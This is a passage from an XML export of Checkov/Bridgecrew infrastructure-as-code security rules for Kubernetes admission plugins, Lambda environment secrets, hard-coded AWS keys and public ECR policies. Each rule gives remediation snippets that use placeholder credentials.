<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver-passed
  namespace: kube-system
spec:
  containers:
    - command:
        - kube-apiserver
        - --enable-admission-plugins=other
      image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
      livenessProbe:
        failureThreshold: 8
        httpGet:
          host: 127.0.0.1
          path: /healthz
          port: 6443
          scheme: HTTPS
        initialDelaySeconds: 15
        timeoutSeconds: 15
      name: kube-apiserver
      resources:
        requests:
          cpu: 250m
      volumeMounts:
        - mountPath: /etc/kubernetes/
          name: k8s
          readOnly: true
        - mountPath: /etc/ssl/certs
          name: certs
        - mountPath: /etc/pki
          name: pki
  hostNetwork: true
  volumes:
    - hostPath:
        path: /etc/kubernetes
      name: k8s
    - hostPath:
        path: /etc/ssl/certs
      name: certs
    - hostPath:
        path: /etc/pki
      name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-alwaysadmit-is-not-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-alwaysadmit-is-not-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-alwaysadmit-is-not-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_80</key>
    <name>Ensure the admission control plugin AlwaysPullImages is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-admission-control-plugin-alwayspullimages-is-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-admission-control-plugin-always-pull-images-is-not-set"></div>The admission control plugin AlwaysPullImages is not set</div><a aria-label="Skip link to The admission control plugin AlwaysPullImages is not set" class="heading-anchor-icon fa fa-anchor" href="#the-admission-control-plugin-alwayspullimages-is-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Always pull images.<br/>
Setting admission control policy to AlwaysPullImages forces every new pod to pull the required images every time. In a multi-tenant cluster users can be assured that their private images can only be used by those who have the credentials to pull them. Without this admission control policy, once an image has been pulled to a node, any pod from any user can use it simply by knowing the image&#8217;s name, without any authorization check against the image ownership. When this plug-in is enabled, images are always pulled prior to starting containers, which means valid credentials are required.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --enable-admission-plugins=AlwaysPullImages
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-alwayspullimages-is-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-alwayspullimages-is-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-alwayspullimages-is-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_45</key>
    <name>Ensure Lambda function's environment variables do not expose secrets</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="lambda-functions-environment-variables-expose-secrets"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-lambda-functions-environment-variables-expose-secrets"></div>Lambda function's environment variables expose secrets</div><a aria-label="Skip link to Lambda function's environment variables expose secrets" class="heading-anchor-icon fa fa-anchor" href="#lambda-functions-environment-variables-expose-secrets"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A function's metadata includes environment variable fields that contain small configurations that help the function execute. These variables can be accessed by any entity with the most basic read-metadata-only permissions, and cannot be encrypted. Lambda runtime makes environment variables available without passing secrets in code or environment variables. </p>
<p>We recommend you remove secrets from unencrypted places, especially if they can be easily accessed, to reduce the risk of exposing data to third parties.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To see the secrets, run the following CLI command:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws lambda get-function-configuration 
--region &lt;REGION&gt; 
--function-name &lt;FUNCTION_NAME&gt; 
--query Environment.Variables
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::Lambda::Function</li>
<li><strong>Argument:</strong> Properties.Environment.Variables</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::Lambda::Function
    Properties:
        ...
        Environment:
            Variables:
                key1: not_a_secret
-           key2: secret
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime-1"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_lambda_function</li>
<li><strong>Argument</strong> Block Environment Attribute variables</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_lambda_function.fail.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_lambda_function.fail.tf">resource "aws_lambda_function" "fail" {
  function_name = "test-env"
  role = ""
  runtime = "python3.8"

  environment {
    variables = {
-      AWS_ACCESS_KEY_ID     = "AKIAIOSFODNN7EXAMPLE",
-      AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
-      AWS_DEFAULT_REGION    = "us-west-2"
     }
  }
}
</code></pre></div></div>
<p>In this case the permissions would be better being added to an IAM Role.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_secrets_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_secrets_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_secrets_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_41</key>
    <name>Ensure AWS access keys and secrets are not hard coded in infrastructure</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-access-keys-and-secrets-are-hard-coded-in-infrastructure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-access-keys-and-secrets-are-hard-coded-in-infrastructure"></div>AWS access keys and secrets are hard coded in infrastructure</div><a aria-label="Skip link to AWS access keys and secrets are hard coded in infrastructure" class="heading-anchor-icon fa fa-anchor" href="#aws-access-keys-and-secrets-are-hard-coded-in-infrastructure"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When accessing AWS programmatically users can select to use an access key to verify their identity, and the identity of their applications. An access key consists of an access key ID and a secret access key. Anyone with an access key has the same level of access to AWS resources. </p>
<p>We recommend you protect access keys and keep them private. Specifically, do not store hard coded keys and secrets in infrastructure such as code, or other version-controlled configuration settings.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>You really should not add your secrets to your Infrastructure code, obtain AWS through the keychain e.g. via Environmental variables.<br/>
Remove any reference to access_key and secret_key.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">provider.aws.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="provider.aws.tf">provider "aws" {
  region = var.region
  - access_key = "NOTEXACTLYAKEY"
  - secret_key = "NOTACTUALLYASECRET"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_secrets_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_secrets_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_secrets_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_32</key>
    <name>Ensure AWS ECR repository is not exposed to public</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-private-ecr-repository-policy-is-overly-permissive"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-private-ecr-repository-policy-is-overly-permissive"></div>AWS Private ECR repository policy is overly permissive</div><a aria-label="Skip link to AWS Private ECR repository policy is overly permissive" class="heading-anchor-icon fa fa-anchor" href="#aws-private-ecr-repository-policy-is-overly-permissive"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS ECR is a managed Docker registry service that simplifies Docker container image management. The ECR repository is a collection of Docker images available on AWS. Access control to ECR repositories is governed using resource-based policies. A public ECR repository can expose internal Docker images that contain confidential business logic. </p>
<p>We recommend you do not allow unrestricted public access to ECR repositories to help avoid data leakage. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/ecs/" target="_self">Amazon ECS console</a>.</li>
<li>Select <strong>Amazon ECR </strong>, then select <strong>Repositories</strong>.</li>
<li>Click the image repository that you want to configure. To modify the permission policy, select <strong>Permissions</strong>.</li>
<li>In the <strong>Permission statements</strong>, select the <em>policy statement</em> that has <strong>Effect </strong>set to <strong>Allow</strong> and <strong>Principal</strong> set to <strong>*</strong>.</li>
<li>To select a restricted access policy, click <strong>Edit</strong> and make changes.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<p><strong>Resource:</strong> AWS::ECR::Repository<br/>
<strong>Argument:</strong> Properties.RepositoryPolicyText.Statement.Principal</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources: 
  MyRepository: 
    Type: AWS::ECR::Repository
    Properties: 
      ...
      RepositoryPolicyText: 
        ...
        Statement: 
          - ...
-           Principal: "*"
+                       Principal:
+             AWS: 
+                - "arn:aws:iam::123456789012:user/Bob"
+                - ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/public_1-ecr-repositories-not-public' target='_blank'> https://docs.bridgecrew.io/docs/public_1-ecr-repositories-not-public</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/public_1-ecr-repositories-not-public' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_81</key>
    <name>Ensure the admission control plugin SecurityContextDeny is sSet if PodSecurityPolicy is not used</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-admission-control-plugin-securitycontextdeny-is-set-if-podsecuritypolicy-is-used"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-admission-control-plugin-security-context-deny-is-set-if-pod-security-policy-is-used"></div>The admission control plugin SecurityContextDeny is set if PodSecurityPolicy is used</div><a aria-label="Skip link to The admission control plugin SecurityContextDeny is set if PodSecurityPolicy is used" class="heading-anchor-icon fa fa-anchor" href="#the-admission-control-plugin-securitycontextdeny-is-set-if-podsecuritypolicy-is-used"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The SecurityContextDeny admission controller can be used to deny pods which make use of some SecurityContext fields which could allow for privilege escalation in the cluster. This should be used where PodSecurityPolicy is not in place within the cluster.<br/>
SecurityContextDeny can be used to provide a layer of security for clusters which do not have PodSecurityPolicies enabled.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --enable-admission-plugins=SecurityContextDeny
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-securitycontextdeny-is-set-if-podsecuritypolicy-is-not-used' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-securitycontextdeny-is-set-if-podsecuritypolicy-is-not-used</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-securitycontextdeny-is-set-if-podsecuritypolicy-is-not-used' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_82</key>
    <name>Ensure the admission control plugin ServiceAccount is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-admission-control-plugin-serviceaccount-is-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-admission-control-plugin-service-account-is-not-set"></div>The admission control plugin ServiceAccount is not set</div><a aria-label="Skip link to The admission control plugin ServiceAccount is not set" class="heading-anchor-icon fa fa-anchor" href="#the-admission-control-plugin-serviceaccount-is-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Automate service accounts management. When you create a pod, if you do not specify a service account, it is automatically assigned the default service account in the same namespace. You should create your own service account and let the API server manage its security tokens.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --enable-admission-plugins=ServiceAccount
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-serviceaccount-is-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-serviceaccount-is-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-serviceaccount-is-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_83</key>
    <name>Ensure the admission control plugin NamespaceLifecycle is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-admission-control-plugin-namespacelifecycle-is-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-admission-control-plugin-namespace-lifecycle-is-not-set"></div>The admission control plugin NamespaceLifecycle is not set  </div><a aria-label="Skip link to The admission control plugin NamespaceLifecycle is not set  " class="heading-anchor-icon fa fa-anchor" href="#the-admission-control-plugin-namespacelifecycle-is-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Reject creating objects in a namespace that is undergoing termination.<br/>
Setting admission control policy to NamespaceLifecycle ensures that objects cannot be created in non-existent namespaces, and that namespaces undergoing termination are not used for creating the new objects. This is recommended to enforce the integrity of the namespace termination process and also for the availability of the newer objects.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --enable-admission-plugins=NamespaceLifecycle
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-namespacelifecycle-is-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-namespacelifecycle-is-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-namespacelifecycle-is-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_84</key>
    <name>Ensure the admission control plugin PodSecurityPolicy is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-admission-control-plugin-podsecuritypolicy-is-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-admission-control-plugin-pod-security-policy-is-not-set"></div>The admission control plugin PodSecurityPolicy is not set</div><a aria-label="Skip link to The admission control plugin PodSecurityPolicy is not set" class="heading-anchor-icon fa fa-anchor" href="#the-admission-control-plugin-podsecuritypolicy-is-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Reject creating pods that do not match Pod Security Policies.<br/>
A Pod Security Policy is a cluster-level resource that controls the actions that a pod can perform and what it has the ability to access. The PodSecurityPolicy objects define a set of conditions that a pod must run with in order to be accepted into the system. Pod Security Policies are comprised of settings and strategies that control the security features a pod has access to and hence this must be used to control pod access permissions.</p>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>When the PodSecurityPolicy admission plugin is in use, there needs to be at least one PodSecurityPolicy in place for ANY pods to be admitted. See section 5.2 for recommendations on PodSecurityPolicy settings.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --enable-admission-plugins=PodSecurityPolicy
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-podsecuritypolicy-is-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-podsecuritypolicy-is-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-podsecuritypolicy-is-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_86</key>
    <name>Ensure the --insecure-bind-address argument is not set</name>
    <description>
